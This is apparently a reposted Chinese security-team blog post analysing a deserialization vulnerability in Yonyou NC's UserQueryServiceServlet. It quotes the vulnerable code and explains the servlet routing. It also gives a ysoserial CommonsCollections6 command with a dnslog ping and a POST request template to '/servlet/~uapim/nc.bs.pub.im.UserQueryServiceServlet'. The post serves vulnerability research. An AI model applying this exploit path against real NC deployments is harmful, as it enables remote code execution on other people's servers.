> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247487364&idx=1&sn=744d24f074c71851c7a36876bc42c3bc

#  OA系统漏洞审计之用友NC反序列化 UserQueryServiceServlet  
原创 chobits02  C4安全团队   2025-06-25 06:02  
  
## 前言  
  
想水个文章，不得不说，这个漏洞算是比较简单的了，师傅们如果学过点代码可以一起分析看个乐呵，感谢师傅们的支持  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJQbVxo0a4zRoVkIFaz2cKA5ib3aFe4hhtP7M1fg56N1OZyaxT5rh0EWanI3cO7VYruqSmYovEc9U6A/640?wx_fmt=jpeg&from=appmsg "")  
  
要分析漏洞就要进代码，和活要见人死要见尸一个道理  
  
用findstr找关键字，可以看到漏洞jar包名称，jar包在
```
uapim
```

  
的目录下  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQbVxo0a4zRoVkIFaz2cKA5Fu6FeicTZVAt2iaoC2GeiausjpbjVp9nKepHT5lRq1tKMp9m7Ubxtc4dA/640?wx_fmt=png&from=appmsg "")  
  
这个方法的完整路径为
```
nc.bs.pub.im.UserQueryServiceServlet
```

  
  

```
就像你问你外国女朋友，你全名是啥，有没有中间名之类的，方便找到祖宗十八代
```

  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQbVxo0a4zRoVkIFaz2cKA5KSBibDk9Cf195mdOlJxhk6RByq9RQUNV7bAgULc27V7oNYibYEC2icjrA/640?wx_fmt=png&from=appmsg "")  
  
关键代码如下  

```
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
ObjectInputStream in = new ObjectInputStream((InputStream)request.getInputStream());  
HashMap<Object, Object> params = new HashMap<>();  
ObjectOutputStream oos = new ObjectOutputStream((OutputStream)response.getOutputStream());  
HashMap<Object, Object> result = new HashMap<>();  
try {  
  params = (HashMap<Object, Object>)in.readObject();
```

  
此处POST请求时，读取了输入流，之后对输入流方法进行
```
in.readObject()
```

  
造成了反序列化漏洞，真的是简单粗暴  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQbVxo0a4zRoVkIFaz2cKA5pH0a9Duic2BDL8gzJfN78vPiaBavqDP3QZV4YU0KEUiaCqpbTicmicxcfAg/640?wx_fmt=png&from=appmsg "")  
  
然后接一段废话，就是这个漏洞到底该怎么请求利用，每个漏洞都有自己的游戏规则：  
  
来到具体的请求URL上面，要调用
```
UserQueryServiceServlet
```

  
类，只要在请求路由加上
```
/~包名称
```

  
+
```
UserQueryServiceServlet
```

  
类的完整路径即可  
  
查看系统的
```
Web.xml
```

  
可以看见请求
```
/service
```

  
和
```
/servlet
```

  
前缀的都经过
```
NCInvokerServlet
```

  
方法处理  
  
  
就是这个不负责任的保安把小区外面的人放进来了  
  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQbVxo0a4zRoVkIFaz2cKA5hiavluz0kia7wCC2KAMnhXPGzLJ23Zc3MlMc9am3O2Nic6Yiana2JaayWA/640?wx_fmt=png&from=appmsg "")  
  

```
NCInvokerServlet
```

  
方法主要功能是获得url路径后，如果是以
```
/~
```

  
开头，截取第一部分为
```
moduleName
```

  
，然后再截取第二部分为
```
serviceName
```

  
，再根据
```
getServiceObject(moduleName, serviceName)
```

  
实现任意Servlet的调用。  
  
这里包名称是
```
uapim
```

  
，再加上方法的完整路径就能进行请求了，懂了吗师傅们  
  
  
回到漏洞，这里测试使用
```
ysoserial-all.jar
```

  
生成
```
cc6
```

  
的利用链请求dnslog，保存到本地的c.bin文件中  

```
java -jar ysoserial-all.jar CommonsCollections6 &#34;ping xxe.jagvy1.dnslog.cn&#34; > c.bin

```

  
再读取c.bin文件请求即可  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQbVxo0a4zRoVkIFaz2cKA5P2ZBzPKYETJBBM68Z8ogJR6B0icD4oWyIZwLD6X6v8ibGRWjUkgRfKBw/640?wx_fmt=png&from=appmsg "")  
  
接收到请求记录  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQbVxo0a4zRoVkIFaz2cKA5znnnNfoGCQ5uldgVlHFibYr7O82XYVuV4PSptGKxJmPx45MLFVG3dVA/640?wx_fmt=png&from=appmsg "")  
  
请求利用POC如下  

```
POST /servlet/~uapim/nc.bs.pub.im.UserQueryServiceServlet HTTP/1.1
Host: 
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15


反序列化POC
```

  
  
  
最后总结  
  
感兴趣的可以公众号私聊我  
进团队交流群，  
咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
  
**内部src培训视频，内部知识圈，可私聊领取优惠券**  
  
**加入团队、加入公开群等都可联系微信：yukikhq，搜索添加即可。**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJQSCTuiawtOw7G9JFaBeBc06sHdBhSTMMClOr5wLWmLYIl6Yry9n3ZIL97tylQib5YLOuJFxndeFMEg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
END  
  
  
